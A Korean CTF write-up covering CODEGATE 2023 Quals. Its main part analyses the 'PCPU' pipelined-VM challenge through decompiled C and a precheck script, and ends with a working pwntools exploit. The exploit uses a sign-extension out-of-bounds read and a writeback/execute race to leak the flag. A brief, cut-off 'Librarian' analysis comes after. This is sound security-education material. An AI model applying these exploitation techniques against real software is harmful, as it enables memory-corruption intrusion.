---
title: "CODEGATE 2023 Quals"
description: "CODEGATE 2023 Quals"
dateString: June 2023
draft: false
tags: ["CODEGATE 2023 Quals"]
weight: 30
date: 2023-06-24
# cover:
    # image: ""
---

# PCPU
대회 끝나기 2시간정도 전에 잡았었는데, 분석하기 빡세고 구조체도 많아서 시간내로 못풀었다.
나중에 끝나고 천천히 풀어봤다.
파이프라이닝이 적용된 VCPU 컨셉의 문제다.
## Analysis
```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  init_();
  input_validchk();                             // opcode(1byte) | operands(3bytes)
  while ( PC <= instr_sz )
  {
    run_cycle();
    ++PC;
  }
  run_cycle();
  run_cycle();
  run_cycle();
  print_cycle();
  return 0LL;
}
```
```c
int init_()
{
  unsigned int v0; // eax

  v0 = time(0LL);
  srand(v0);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  IF_NODE = malloc(0x10uLL);
  ID_NODE = malloc(0x10uLL);
  OF_NODE = malloc(0x10uLL);
  EX_NODE = malloc(0x10uLL);
  REG = malloc(0x20uLL);
  memset(REG, 0, sizeof(REG_SETS));
  init_m(IF_NODE);
  init_m(ID_NODE);
  init_m(OF_NODE);
  init_m(EX_NODE);
  ANON.is_active = 1LL;                         // 06230
  *ANON.payload = rand() % 10;
  ANON1.is_active = 1LL;                        // 16238
  *ANON1.payload = rand() % 10;
  ANON2.is_active = 1LL;                        // 26240
  *ANON2.payload = rand() % 10;
  ANON3.is_active = 1LL;                        // 0036248
  *ANON3.payload = rand() % 10;
  pthread_mutex_init(&IF_mutex, 0LL);           // 10008
  pthread_mutex_init(&ID_mutex, 0LL);
  pthread_mutex_init(&OF_mutex, 0LL);
  return pthread_mutex_init(&mutex_4, 0LL);
}
```
```c
void input_validchk()
{
  const char *v0; // rax
  int stat_loc; // [rsp+18h] [rbp-58h] BYREF
  unsigned int v2; // [rsp+1Ch] [rbp-54h]
  char *argv[4]; // [rsp+20h] [rbp-50h] BYREF
  __pid_t pid; // [rsp+44h] [rbp-2Ch]
  char *v5; // [rsp+48h] [rbp-28h]
  size_t j; // [rsp+50h] [rbp-20h]
  FILE *stream; // [rsp+58h] [rbp-18h]
  void *s; // [rsp+60h] [rbp-10h]
  size_t i; // [rsp+68h] [rbp-8h]

  printf("Inst Size > ");
  __isoc99_scanf("%ld", &instr_sz);
  instr = calloc(4uLL, instr_sz);
  for ( i = 0LL; i < instr_sz; ++i )
  {
    printf("Inst %lu > ", i);
    __isoc99_scanf("%d", &instr[i]);
  }
  PC = 0LL;
  s = malloc(0x20uLL);
  memset(s, 0, 0x20uLL);
  v0 = mkrandSTR(16);
  snprintf(s, 0x20uLL, "/tmp/ctf-%s", v0);
  stream = fopen(s, "w");
  fprintf(stream, "%lu\n", instr_sz);
  for ( j = 0LL; j < instr_sz; ++j )
    fprintf(stream, "%d\n", instr[j]);
  fclose(stream);
  v5 = malloc(0x100uLL);
  memset(v5, 0, 0x100uLL);
  snprintf(v5, 0x100uLL, "python3 ./precheck.py %s 1>/dev/null 2>/dev/null", s);
  pid = fork();
  if ( pid == -1 )
  {
    perror("fork failed");
    exit(1);
  }
  if ( !pid )
  {
    argv[0] = "/bin/sh";
    argv[1] = "-c";
    argv[2] = v5;
    argv[3] = 0LL;
    v2 = execve("/bin/sh", argv, 0LL);
    printf("%d\n", v2);
  }
  if ( waitpid(pid, &stat_loc, 0) == -1 )
  {
    perror("waitpid failed");
    exit(1);
  }
  if ( (stat_loc & 0x7F) == 0 && (stat_loc & 0xFF00) >> 8 == 1 )
  {
    printf("Invalid opcodes\n");
    exit(1);
  }
  free(s);
  free(v5);
}
```
여기서 4바이트 instructions 받고 precheck.py 호출해서 유효성 검사를 수행한다.

```python
from pwn import *
import sys
import os

f = open(sys.argv[1], 'rb')
size = int(f.readline())

ops = []

for i in range(size):
    ops.append(p32(int(f.readline()) & 0xffffffff))
f.close()

regs = {
    '0': {'size': 0, 'data': 0},
    '1': {'size': 0, 'data': 0},
    '2': {'size': 0, 'data': 0},
    '3': {'size': 0, 'data': 0},
}

for op in ops:
    inst = op[0]
    print(inst)

    if inst == 0:
        idx = op[1]
        data = u16(op[2:])
        assert 0 <= idx <= 3
        regs[str(idx)]['data'] = data
    elif inst == 1:
        dest  = op[1]
        pad  = op[2]
        src = op[3]
        assert 0 <= src <= 3
        assert pad == 0
        assert 0 <= dest <= 3
        regs[str(dest)]['data'] = regs[str(src)]['data']

    elif inst == 2:
        idx  = op[1]
        size = u16(op[2:])
        assert 0 <= idx <= 3

        regs[str(idx)]['size'] = size
        regs[str(idx)]['data'] = [0 for i in range(size)]

    elif inst == 3:
        reg  = op[1]
        idx  = op[2]
        data = op[3]
        assert 0 <= reg <= 3
        assert isinstance(regs[str(reg)]['data'], list)
        assert idx < regs[str(reg)]['size']

        regs[str(reg)]['data'][idx] = data

    elif inst == 4:
        dest  = op[1]
        reg  = op[2]
        idx = op[3]
        assert 0 <= dest <= 3
        assert 0 <= reg <= 3
        assert isinstance(regs[str(reg)]['data'], list)
        assert idx < regs[str(reg)]['size']    

        regs[str(dest)]['data'] = regs[str(reg)]['data'][idx]
    elif inst == 5:
        reg  = op[1]
        pad  = op[2]
        data = op[3]
        assert 0 <= reg <= 3
        assert pad == 0
        assert isinstance(regs[str(reg)]['data'], list)
        assert isinstance(regs['0']['data'], int)
        assert regs['0']['data'] < regs[str(reg)]['size']    

        regs[str(reg)]['data'][regs['0']['data']] = data
    elif inst == 6:
        dest  = op[1]
        pad = op[2]
        reg  = op[3]
        assert 0 <= dest <= 3
        assert 0 <= reg <= 3
        assert pad == 0
        assert isinstance(regs[str(reg)]['data'], list)
        assert isinstance(regs['0']['data'], int)
        assert regs['0']['data'] < regs[str(reg)]['size']    

        regs[str(dest)]['data'] = regs[str(reg)]['data'][regs['0']['data']]
    elif inst == 7:
        pass
    else:
        assert 0 <= inst <= 7
```
실제 vm에서 처리될때랑은 약간 다르게 검사하긴하는데, 대강 비슷비슷하다.
```c
__int64 sub_26F0()
{
  pthread_create(&th0, 0LL, WB_, 0LL);
  pthread_create(&th1, 0LL, EX_, 0LL);
  pthread_create(&th2, 0LL, ID2, 0LL);
  pthread_create(&th3, 0LL, ID_, 0LL);
  pthread_create(&th4, 0LL, IF_, 0LL);
  pthread_join(th0, 0LL);
  pthread_join(th1, 0LL);
  pthread_join(th2, 0LL);
  pthread_join(th3, 0LL);
  pthread_join(th4, 0LL);
  return ++cycle;
}
```
파이프라이닝이 구현되어있다. 
한 사이클에  IF, ID, ID2, EX, WB 병렬적으로 수행된다.
![](/blog/CODEGATE_Junior_2023_Quals/image.png)
기본적인 5단계 파이프라이닝이랑 약간 달랐다.
앞에 Operand Fetch 같은 작업이 있을 줄 알았는데, OF라고 보기엔 그냥 디코딩에 가까워서 ID, ID2라고 네이밍했다.

```c
void *__fastcall sub_1640(void *a1)
{
  struct IF_STR *v2; // [rsp+0h] [rbp-10h]

  if ( PC < instr_sz )
  {
    v2 = malloc(0x10uLL);
    v2->INSTR = instr[PC];
    v2->PC = PC;
    pthread_mutex_lock(&IF_mutex);
    reg_node(IF_NODE, v2);
    pthread_mutex_unlock(&IF_mutex);
  }
  return 0LL;
}
```
Instruction Fetch를 진행하고 IF_NODE에 등록한다.
```c
node *__fastcall Register_node(node *prev_node, node *new_node)
{
  node *result; // rax
  struct node *mid_node; // [rsp+8h] [rbp-18h]

  mid_node = malloc(0x10uLL);
  mid_node->A = new_node;
  mid_node->B = 0LL;
  if ( prev_node->B )
    *(prev_node->B + 8) = mid_node;
  else
    prev_node->A = mid_node;
  result = prev_node;
  prev_node->B = mid_node;
  return result;
}
```

```c
void *__fastcall ID_(void *a1)
{
  ID_STR *v2; // [rsp+8h] [rbp-18h]
  struct IF_STR *R_NODE; // [rsp+10h] [rbp-10h]

  R_NODE = RET_R_NODE(IF_NODE);                 // IF_NODE -> MID_NODE -> INST_R_NODE
  if ( R_NODE )
  {
    v2 = malloc(0x10uLL);
    v2->PC = R_NODE->PC;                        // INST_NODE
    *&v2->opcode = R_NODE->INSTR;
    v2->operand2 = BYTE2(R_NODE->INSTR);
    v2->operand3 = HIBYTE(R_NODE->INSTR);
    pthread_mutex_lock(&ID_mutex);
    reg_node(ID_NODE, v2);
    pthread_mutex_unlock(&ID_mutex);
    free(R_NODE);
  }
  return 0LL;
}
```
Instruction Decode. 
opcode와 operand를 분리한다.

```c
void *__fastcall ID_2(void *a1)
{
  __int16 v2; // [rsp+16h] [rbp-1Ah]
  struct ID2_STR *v3; // [rsp+18h] [rbp-18h]
  struct ID_STR *n; // [rsp+20h] [rbp-10h]

  n = RET_R_NODE(ID_NODE);
  if ( n )
  {
    v3 = malloc(0x10uLL);
    v3->opcode = n->opcode;
    v3->PC = n->PC;
    switch ( n->opcode )
    {
      case 0:
      case 2:
        v2 = n->operand2 + (n->operand3 << 8);
        v3->flag = 0;
        v3->operand1 = n->operand1;
        *&v3->operand2 = v2;
        break;
      case 1:
        v3->flag = 0;
        v3->operand1 = n->operand1;
        v3->operand2 = n->operand2;
        v3->operand3 = n->operand3;
        break;
      case 3:
        v3->flag = 1;
        v3->operand1 = n->operand1;
        v3->operand2 = n->operand2;
        v3->operand3 = n->operand3;
        break;
      case 4:
        v3->flag = 0;
        v3->operand1 = n->operand1;
        v3->operand2 = n->operand2;
        v3->operand3 = n->operand3;
        break;
      case 5:
        v3->flag = 1;
        v3->operand1 = n->operand1;
        v3->operand2 = 0;
        v3->operand3 = n->operand3;
        break;
      case 6:
        v3->flag = 0;
        v3->operand1 = n->operand1;
        v3->operand2 = 0;
        v3->operand3 = n->operand3;
        break;
      case 7:
        v3->flag = 0;
        v3->operand1 = 0;
        v3->operand2 = 0;
        v3->operand3 = 0;
        break;
      default:
        break;
    }
    pthread_mutex_lock(&ID2_mutex);
    reg_node(ID2_NODE, v3);
    pthread_mutex_unlock(&ID2_mutex);
    free(n);
  }
  return 0LL;
}
```
opcode에 따라 처리되는 operand가 다르다.

```c
void *__fastcall EX_(void *a1)
{
  __int64 v2; // [rsp+8h] [rbp-98h]
  __int64 v3; // [rsp+10h] [rbp-90h]
  __int64 v4; // [rsp+18h] [rbp-88h]
  __int64 v5; // [rsp+20h] [rbp-80h]
  __int64 v6; // [rsp+28h] [rbp-78h]
  __int64 v7; // [rsp+30h] [rbp-70h]
  __int64 v8; // [rsp+38h] [rbp-68h]
  __int64 v9; // [rsp+40h] [rbp-60h]
  __int64 X3; // [rsp+48h] [rbp-58h]
  __int64 X2; // [rsp+50h] [rbp-50h]
  __int64 X1; // [rsp+58h] [rbp-48h]
  __int64 v13; // [rsp+60h] [rbp-40h]
  __int64 v14; // [rsp+68h] [rbp-38h]
  __int64 v15; // [rsp+70h] [rbp-30h]
  __int64 *X0; // [rsp+78h] [rbp-28h]
  __int64 v17; // [rsp+80h] [rbp-20h]
  EX_STR *v18; // [rsp+88h] [rbp-18h]
  struct ID2_STR *R_NODE; // [rsp+90h] [rbp-10h]

  R_NODE = RET_R_NODE(ID2_NODE);
  if ( R_NODE )
  {
    v18 = malloc(0x18uLL);
    v18->PC = R_NODE->PC;
    switch ( R_NODE->opcode )
    {
      case 0:                                   // MOV IMM
        v18->INDEX = R_NODE->operand1;
        v18->RES = *&R_NODE->operand2;          // operand1 | 0 | operand2, 3
        break;
      case 1:                                   // MOV REG
        v18->INDEX = R_NODE->operand1;
        if ( R_NODE->operand3 )
        {
          switch ( R_NODE->operand3 )
          {
            case 1:
              v18->RES = REG->X1;
              REG->X1 = 0LL;
              break;
            case 2:
              v18->RES = REG->X2;
              REG->X2 = 0LL;
              break;
            case 3:
              v18->RES = REG->X3;
              REG->X3 = 0LL;
              break;
          }
        }
        else
        {
          v18->RES = REG->X0;
          REG->X0 = 0LL;
        }
        break;
      case 2:
        v18->INDEX = R_NODE->operand1;
        v18->RES = GET_STR();
        break;
      case 3:
        v18->INDEX = 0xFF;
        if ( R_NODE->operand1 )
        {
          switch ( R_NODE->operand1 )
          {
            case 1:
              X0 = REG->X0;
              sleep(1u);
              *(X0 + R_NODE->operand2 + 8) = R_NODE->operand3;
              break;
            case 2:
              v15 = REG->X0;
              sleep(1u);
              *(v15 + R_NODE->operand2 + 8) = R_NODE->operand3;
              break;
            case 3:
              v14 = REG->X0;
              sleep(1u);
              *(v14 + R_NODE->operand2 + 8) = R_NODE->operand3;
              break;
          }
        }
        else
        {
          v17 = REG->X0;
          sleep(1u);
          *(v17 + R_NODE->operand2 + 8) = R_NODE->operand3;
        }
        break;
      case 4:
        v18->INDEX = R_NODE->operand1;
        if ( R_NODE->operand2 )
        {
          switch ( R_NODE->operand2 )
          {
            case 1:
              X1 = REG->X1;                     // VULN
              sleep(1u);
              v18->RES = *(X1 + R_NODE->operand3 + 8);// sign extend
              break;
            case 2:
              X2 = REG->X2;
              sleep(1u);
              v18->RES = *(X2 + R_NODE->operand3 + 8);
              break;
            case 3:
              X3 = REG->X3;
              sleep(1u);
              v18->RES = *(X3 + R_NODE->operand3 + 8);
              break;
          }
        }
        else
        {
          v13 = REG->X0;
          sleep(1u);
          v18->RES = *(v13 + R_NODE->operand3 + 8);
        }
        break;
      case 5:
        v18->INDEX = 0xFF;
        if ( R_NODE->operand1 )
        {
          switch ( R_NODE->operand1 )
          {
            case 1:
              v8 = REG->X1;
              sleep(1u);
              *(v8 + REG->X0 + 8) = R_NODE->operand3;
              break;
            case 2:
              v7 = REG->X2;
              sleep(1u);
              *(v7 + REG->X0 + 8) = R_NODE->operand3;
              break;
            case 3:
              v6 = REG->X3;
              sleep(1u);
              *(v6 + REG->X0 + 8) = R_NODE->operand3;
              break;
          }
        }
        else
        {
          v9 = REG->X0;
          sleep(1u);
          *(v9 + REG->X0 + 8) = R_NODE->operand3;
        }
        break;
      case 6:
        v18->INDEX = R_NODE->operand1;
        if ( R_NODE->operand3 )
        {
          switch ( R_NODE->operand3 )
          {
            case 1:
              v4 = REG->X1;
              sleep(1u);
              v18->RES = *(v4 + REG->X0 + 8);   // vuln sign extend
              break;
            case 2:
              v3 = REG->X2;
              sleep(1u);
              v18->RES = *(v3 + REG->X0 + 8);
              break;
            case 3:
              v2 = REG->X3;
              sleep(1u);
              v18->RES = *(v2 + REG->X0 + 8);
              break;
          }
        }
        else
        {
          v5 = REG->X0;
          sleep(1u);
          v18->RES = *(v5 + REG->X0 + 8);
        }
        break;
      case 7:
        DUMP_REGS();                            // v18 -> RES and v18 -> INDEX  == 0
                                                // stack race, X0 register Reset SEGV
        break;
      default:
        break;
    }
    pthread_mutex_lock(&mutex_4);
    reg_node(EX_NODE, v18);                     // Vuln EX <-> WB race
    pthread_mutex_unlock(&mutex_4);
    free(R_NODE);
  }
  return 0LL;
}
```
실질적으로 처리가 되는 부분이다.
```
MOV DREG, IMM16
MOV DREG, SREG
GET_RSTR()
MOV X0[IDX8+8], IMM8
MOV DREG, SREG[IDX8+8]
MOV DREG[X0+8], IMM8
MOV DREG, SREG[X0+8]
DUMP_REGS()
```
위 명령들이 구현되어있다.
branch나 레지스터에 대한 연산은 지원되지 않는다.
```c
int __fastcall DUMP_REGS()
{
  printf("================== [REGS] ==================\n");
  printf("X0 : 0x%lx\n", REG->X0);
  printf("X1 : 0x%lx\n", REG->X1);
  printf("X2 : 0x%lx\n", REG->X2);
  printf("X3 : 0x%lx\n", REG->X3);
  return printf("============================================\n");
}
```
```c
char *__fastcall GET_STR()
{
  int i; // [rsp+14h] [rbp-Ch]

  for ( i = 0; i < 4; ++i )                     // 0x10008/8 = 0x2001
  {
    if ( ANON[i].is_active == 1 )
    {
      strcpy(ANON[i].payload, (&str_list)[*ANON[i].payload]);
      ANON[i].is_active = 0LL;
      return &ANON[i];                          // sz 0x10008
    }
  }                                             // 4 chances return STR
  return 0LL;
}
```
```c
.data:0000000000006100 str_list        dq offset aLoremIpsumDolo
.data:0000000000006100                                         ; DATA XREF: GET_STR+72↑o
.data:0000000000006100                                         ; "Lorem ipsum dolor sit amet, consectetur"...
.data:0000000000006108                 dq offset aInViverraEnimE ; "In viverra enim eu mollis consequat. Nu"...
.data:0000000000006110                 dq offset aVestibulumVelL ; "Vestibulum vel laoreet magna. Curabitur"...
.data:0000000000006118                 dq offset aIntegerFringil ; "Integer fringilla urna risus, vel gravi"...
.data:0000000000006120                 dq offset aNullaSemperDig ; "Nulla semper dignissim lectus et rhoncu"...
.data:0000000000006128                 dq offset aPhasellusNecSa ; "Phasellus nec sagittis diam. Aliquam co"...
.data:0000000000006130                 dq offset aDonecTincidunt ; "Donec tincidunt posuere augue, sed port"...
.data:0000000000006138                 dq offset aSuspendisseSod ; "Suspendisse sodales erat sit amet commo"...
.data:0000000000006140                 dq offset aDonecPortaAugu ; "Donec porta augue sed congue cursus. Vi"...
.data:0000000000006148                 dq offset aAliquamConsect ; "Aliquam consectetur accumsan molestie. "...
.data:0000000000006150                 dq offset FLAG          ; "codegate2023{aaaaaaaaaaaaaaaaaaaaaaaaaa"...
.data:0000000000006150 _data           ends
.data:0000000000006150
```
기본적으로 rand()%10으로 메모리 영역이 초기화되어있어서 정상적으로 FLAG는 접근할 수 없다.
```c
void *__fastcall WB_(void *a1)
{
  struct EX_STR *R_NODE; // [rsp+0h] [rbp-10h]

  R_NODE = RET_R_NODE(EX_NODE);
  if ( R_NODE )
  {
    if ( R_NODE->INDEX )
    {
      switch ( R_NODE->INDEX )
      {
        case 1:
          if ( REG->X1 >= 0x10000uLL )
            reset(REG->X1);
          REG->X1 = R_NODE->RES;
          break;
        case 2:
          if ( REG->X2 >= 0x10000uLL )
            reset(REG->X2);
          REG->X2 = R_NODE->RES;
          break;
        case 3:
          if ( REG->X3 >= 0x10000uLL )
            reset(REG->X3);
          REG->X3 = R_NODE->RES;
          break;
      }
    }
    else
    {
      if ( REG->X0 >= 0x10000uLL )
        reset(REG->X0);
      REG->X0 = R_NODE->RES;
    }
    free(R_NODE);
  }
  return 0LL;
}
```
WriteBack으로 결과에 대한 레지스터 쓰기 작업을 수행한다.
```c
node *__fastcall sub_2360(node *a1)
{
  node *result; // rax

  a1->B = rand() % 10;
  result = a1;
  a1->A = 1LL;
  return result;
}
```
특정 메모리 영역을 GET_STR로 다시 리턴받을 수 있도록 초기화해주는 함수다.

```c
__int64 sub_27E0()
{
  sub_2A30(IF_NODE);
  sub_2A30(ID_NODE);
  sub_2A30(ID2_NODE);
  sub_2A30(EX_NODE);
  free(instr);
  printf("Total Cycle: %lu\n", cycle);
  return DUMP_REGS();
}
```
나중에 모두 처리가 완료되면 레지스터 상태랑 사이클을 출력하고 종료한다.
## Exploitation
```c
.text:0000000000001A7F                 mov     edi, 1          ; seconds
.text:0000000000001A84                 call    _sleep
.text:0000000000001A89                 mov     rax, [rbp+var_48]
.text:0000000000001A8D                 mov     rcx, [rbp+R_NODE]
.text:0000000000001A91                 movzx   ecx, byte ptr [rcx+0Dh]
.text:0000000000001A95                 movsx   rcx, byte ptr [rax+rcx+8]
.text:0000000000001A9B                 mov     rax, [rbp+var_18]
```
```
MOV DREG, SREG[IDX8+8]
MOV DREG, SREG[X0+8]
```
위 명령어들은 로드 과정에서 sign bit를 붙여서 확장을 진행해서 OOB가 발생한다.

데이터 의존성에 대한 처리가 미흡해서 race condition이 발생할 수 있다.
```
IF
ID IF 
ID2 ID IF
EX ID2 ID IF
WB EX ID2 ID IF 
IF WB EX ID2 ID IF 
ID IF WB EX ID2 ID IF 
```
위와 형태로 실행된다.
이때 EX는 명령에 따라 처리되는 속도가 가장 크게 달라진다.
EX뿐만 아니라 다른 부분에서도 잠재적인 race condition이 발생할 수 있다.
```
MOV DREG, SREG[IDX8+8]
DUMP_REGS()
```
위 두 명령을 반복적으로 사용해서 플래그를 릭하는데, 여기서 문제가 발생한다.
```
MOV DREG, IMM16
MOV DREG, SREG
GET_RSTR()
DUMP_REGS()
```
위 네가지 명령들을 제외하고는 EX가 처리시간이 가장 늦으니 파이프라이닝시 처리 순서는 웬만하면 WB, ID2, ID, IF, EX 순서이다.
레지스터가 Fetch 되는 시점을 기준으로 파이프라이닝시 순서는 웬만하면 WB, EX, ID2, ID, IF 순서이다.

첫 번째 cycle에서 처리해야할 명령은 `MOV DREG, SREG[IDX8+8]`이고 SREG가 X0이라고 가정하고 생각해보면, EX에서 X0 Fetch가 일어난다. 

두 번째 cycle에서 처리해야할 명령이 `DUMP_REGS()`라고 가정하고 X0이 Fetch되는 시점을 기준으로 생각해보면, 선행 명령의 결과가 WB에서 X0에 저장되고 그다음으로 EX에서 후행 명령 `DUMP_REGS()`를 처리하면서 X0 Fetch가 되며 정상적으로 1바이트를 릭할 수 있다.

세 번째 cycle에서 처리해야할 명령이 `MOV DREG, SREG[IDX8+8]`이고 SREG가 X0이라고 가정하고 X0이 Fetch되는 시점을 기준으로 생각해보면, 선행 명령 `DUMP_REGS()`의 WB에서 X0에 write가 일어나며 이때 업데이트된 `v18->INDEX`와 `v18->RES`는 0이다. 이후 후행 명령 `MOV DREG, SREG[IDX8+8]`이 처리되면서 EX에서 X0이 Fetch되는데, 이때 같은 사이클내에서 WB과 EX 사이의 race가 발생한다. 명령에 따라서 혹은 환경에 따라서 X0이 Fetch 되는 시점이 일정하다는것을 보장할 수 없기에 레지스터의 값은 0이 될 수 있고 유효하지 않은 주소가 참조되며 Segmentation fault가 발생한다.

사실 굳이 안따지고 안터지길 기도하면서 그냥 익스해도 된다 ㅋㅋㅋ.

### Exploit script
```python
from pwn import *

DEBUG = False

off = [0x0025DD,0x001E11]
script = ''
for i in off:
    script += f'brva {hex(i)}\n'
script += 'c\njump * $rip+0xee'

context.terminal = ['tmux','splitw','-h']
context.binary = e = ELF('./app')
if DEBUG:
    p = gdb.debug(e.path, gdbscript = script)
else:
    p = process(e.path)

# opcode | ... operands ... | 

class VM():
    REG_SET = {
        "X0" : 0,
        "X1" : 1,
        "X2" : 2,
        "X3" : 3,
    }
    OPCODE = {
        "MOV DREG, IMM16" : 0,
        "MOV DREG, SREG" : 1,
        "GET_RSTR()" : 2,
        "MOV X0[IDX8+8], IMM8" : 3,
        "MOV DREG, SREG[IDX8+8]" : 4,
        "MOV DREG[X0+8], IMM8" : 5,
        "MOV DREG, SREG[X0+8]" : 6,
        "DUMP_REGS()" : 7,
    }
    def __init__(self):
        self.instructions = []
    def ERR(self,msg):
        print(msg)
        exit(-1)
    def gen(self,opcode,RES_REG=None,operand1=None,operand2=None):
        if opcode in VM.OPCODE.keys():
            op = VM.OPCODE[opcode]
            if op == 0:
                if RES_REG == None or RES_REG not in VM.REG_SET.keys():
                    self.ERR("Unknown RES_REG")
                if operand1 == None:
                    self.ERR("Unknown OPERAND1")
                instr = op | ((VM.REG_SET[RES_REG])<<8) | (operand1&0xffff) << (8*2)
            elif op == 1:
                instr = 0
                if RES_REG == None or RES_REG not in VM.REG_SET.keys():
                    self.ERR("Unknown RES_REG")
                if operand2 == None or operand2 not in VM.REG_SET.keys():
                    self.ERR("Unknown OPERAND2")
                if operand1 != None or operand1 in VM.REG_SET.keys(): 
                    instr |= VM.REG_SET[operand1] << (8*2)              # not really used
                instr = op | ((VM.REG_SET[RES_REG])<<8) | (VM.REG_SET[operand2]) << (8*3)
            elif op == 2:
                if RES_REG == None or RES_REG not in VM.REG_SET.keys():
                    self.ERR("Unknown RES_REG")
                instr = 0 
                instr |= op | VM.REG_SET[RES_REG] << 8 | 0xffff << 8*2
                # 0xffff not used / only to bypass precheck.py assertions
            elif op == 3:
                if operand1 == None:
                    self.ERR("Unknown OPERAND1")
                if operand2 == None:
                    self.ERR("Unknown OPERAND2")
                instr = 0
                instr |= (op | operand1 << (8*2) | operand2 << (8*3))
            elif op == 4:
                if RES_REG == None or RES_REG not in VM.REG_SET.keys():
                    self.ERR("Unknown RES_REG")
                if operand1 == None or operand1 not in VM.REG_SET.keys():
                    self.ERR("Unknown OPERAND1")
                if operand2 == None:
                    self.ERR("Unknown OPERAND2")
                instr = 0
                instr |= (op | ((VM.REG_SET[RES_REG])<<8) |VM.REG_SET[operand1] << (8*2) | operand2 << (8*3))
            elif op == 5:
                if RES_REG == None or RES_REG not in VM.REG_SET.keys():
                    self.ERR("Unknown RES_REG")
                if operand2 == None:
                    self.ERR("Unknown OPERAND2")
                instr = 0
                instr |= (op | VM.REG_SET[RES_REG] << 8 | operand2 << (8*3))
            elif op == 6:
                if RES_REG == None or RES_REG not in VM.REG_SET.keys():
                    self.ERR("Unknown RES_REG")
                if operand2 == None or operand2 not in VM.REG_SET.keys():
                    self.ERR("Unknown OPERAND2")
                instr = 0
                instr |= (op | VM.REG_SET[RES_REG] << 8 | VM.REG_SET[operand2] << (8*3))
            elif op == 7:
                instr = 0
                instr |= op

            self.instructions.append(instr)
        else:
            self.ERR("Unknown OPCODE")
    def out(self):
        return self.instructions

if __name__ == "__main__":

    s = VM()
    s.gen("GET_RSTR()","X1")
    s.gen("MOV DREG, IMM16","X0",0x10)
    s.gen("MOV DREG[X0+8], IMM8","X1",None,(-8)&0xff)

    s.gen("MOV DREG, IMM16","X0",0x0)
    s.gen("MOV DREG[X0+8], IMM8","X1",None,0xa)
    for i in range(7):
        s.gen("MOV DREG, IMM16","X0",i+1)
        s.gen("MOV DREG[X0+8], IMM8","X1",None,0x0)

    s.gen("MOV DREG, IMM16","X0",0x10)
    s.gen("MOV DREG, SREG[X0+8]","X2",None,"X1")
    s.gen("MOV DREG, SREG","X0",None,"X2")

    s.gen("MOV DREG[X0+8], IMM8","X1",None,0x01)

    s.gen("MOV DREG, SREG","X2",None,"X0") # TRANSFER SREG = 0
    s.gen("GET_RSTR()","X0")
    for i in range(100):
        # s.gen("MOV DREG, SREG[IDX8+8]","X3","X0",i)
        s.gen("MOV DREG, SREG[IDX8+8]","X3","X1",i)
        '''
        case 4:
        v3->flag = 0;
        v3->operand1 = n->operand1;
        v3->operand2 = n->operand2;
        v3->operand3 = n->operand3;
        // R_NODE->operand3
        case 1:
        v3->flag = 0;
        v3->operand1 = n->operand1;
        v3->operand2 = n->operand2;
        v3->operand3 = n->operand3;
        '''
        s.gen("DUMP_REGS()") # WB <-> EX // racecondition REGS, NODE
        # CYCLE1 : WB -> ID2 -> ID -> IF -> EX (FETCH X0, sleep 1, DUMP REGS, v18-> RES and v18 -> INDEX == 0) nodeupdate -> RACE 
        # CYCLE2 : WB (EX_NODE race, X0 reset) -> EX(FETCH X0 sleep 1, SEGV) 
        # use X1 instead
    '''
    [  290.815519] app[3419]: segfault at 48 ip 0000563249c0fa49 sp 00007f927a3a4e30 error 4 in app[563249c0f000+2000]
    [  290.819216] Code: 00 00 00 48 8d 05 27 48 04 00 48 8b 00 48 8b 00 48 89 45 c0 bf 01 00 00 00 e8 43 f7 ff ff 48 8b 45 c0 48 8b 4d f0 0f b6 49 0d <48> 0f be 4c 08 08 48 8b 45 e8 48 89 48 10 e9 ee 00 00 00 48 8b 45
    [  290.824907] potentially unexpected fatal signal 11.
    [  290.826388] CPU: 0 PID: 3419 Comm: app Not tainted 5.10.16.3-microsoft-standard-WSL2 #1
    [  290.828778] RIP: 0033:0x563249c0fa49
    [  290.830098] Code: 00 00 00 48 8d 05 27 48 04 00 48 8b 00 48 8b 00 48 89 45 c0 bf 01 00 00 00 e8 43 f7 ff ff 48 8b 45 c0 48 8b 4d f0 0f b6 49 0d <48> 0f be 4c 08 08 48 8b 45 e8 48 89 48 10 e9 ee 00 00 00 48 8b 45
    [  290.835299] RSP: 002b:00007f927a3a4e30 EFLAGS: 00010206
    [  290.836795] RAX: 0000000000000000 RBX: 00007f927a3a56c0 RCX: 0000000000000040
    [  290.839103] RDX: 0000000000000000 RSI: 0000000000000000 RDI: 00007f927a3a59c8
    [  290.841486] RBP: 00007f927a3a4ed0 R08: 0000000000000000 R09: 00000007f9270002
    [  290.843830] R10: 00007f927a3a4df0 R11: 0000000000000293 R12: ffffffffffffff80
    [  290.846245] R13: 0000000000000000 R14: 00007fff94052020 R15: 00007f9279ba5000
    [  290.848460] FS:  00007f927a3a56c0 GS:  0000000000000000
    563249C11000 563249c0fa49
    .text:0000000000001A3D                 mov     rax, [rbp+var_40]
    .text:0000000000001A41                 mov     rcx, [rbp+R_NODE]
    .text:0000000000001A45                 movzx   ecx, byte ptr [rcx+0Dh]
    .text:0000000000001A49                 movsx   rcx, byte ptr [rax+rcx+8]
    .text:0000000000001A4F                 mov     rax, [rbp+var_18]
    .text:0000000000001A53                 mov     [rax+10h], rcx
    '''
    instructions = s.out()

    p.sendlineafter(b'Inst Size >',str(len(instructions)))
    for i in instructions:
        p.sendline(str(i))
    rvu = lambda x : p.recvuntil(x)
    FLAG = ''
    for i in range(100):
        rvu("X3 : ")
        FLAG += (chr(int(rvu('\x0a')[:-1],16)))
        print(FLAG)
    p.interactive()



# IF
# ID IF 
# ID2 ID IF
# EX ID2 ID IF
# WB EX ID2 ID IF 
# IF WB EX ID2 ID IF 
# ID IF WB EX ID2 ID IF 
```

![](/blog/CODEGATE_Junior_2023_Quals/image-1.png)
# Librarian
## Analysis
```c
  sub_184C();
  v3 = time(0LL);
  srand(v3);
  memset(s, 0, 0x780uLL);
  while ( (unsigned int)cnt <= 9 )
  {
    v6 = rand() % 30;
    strcpy(&s[0x80 * (unsigned __int64)(unsigned int)cnt], &aTheCatcherInTh[0x40 * (__int64)v6]);
    ++cnt;
  }
  do
  {
    print_menu();
    __isoc99_scanf("%d", &v5);
    switch ( v5 )
    {
      case 1:
        display((__int64)s);
        break;
      case 2:
        if ( (unsigned int)cnt > 14 )
        {
          puts("The book list is full.");
        }
        else
        {
          add((__int64)s);
          sort((__int64)s);
        }
        break;
      case 3:
        sub_172A((__int64)s);
        break;
      case 4:
        sub_180F(s);
        break;
      case 5:
        puts("Exiting...");
        break;
      default:
        puts("Invalid choice. Please try again.");
